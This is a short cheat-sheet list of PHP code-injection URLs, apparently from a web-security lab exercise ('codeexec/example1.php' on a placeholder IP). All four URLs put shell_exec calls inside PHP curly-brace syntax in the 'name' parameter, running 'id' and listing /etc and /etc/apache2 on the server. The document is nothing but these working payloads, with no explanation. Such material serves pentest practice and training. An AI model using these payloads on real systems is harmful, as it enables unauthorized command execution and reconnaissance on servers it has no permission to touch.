PHP
---
```
http://xxx.xxx.xxx.xxx/codeexec/example1.php?name=hacker%7b$%7bshell_exec('ls%20-al%20/etc/apache2')%7d%7d
http://xxx.xxx.xxx.xxx/codeexec/example1.php?name=hacker{${shell_exec('ls%20-al%20/etc/')}}

http://xxx.xxx.xxx.xxx/codeexec/example1.php?name=hacker%7b$%7bshell_exec('id')%7d%7d
http://xxx.xxx.xxx.xxx/codeexec/example1.php?name=hacker{${shell_exec('id')}}
```
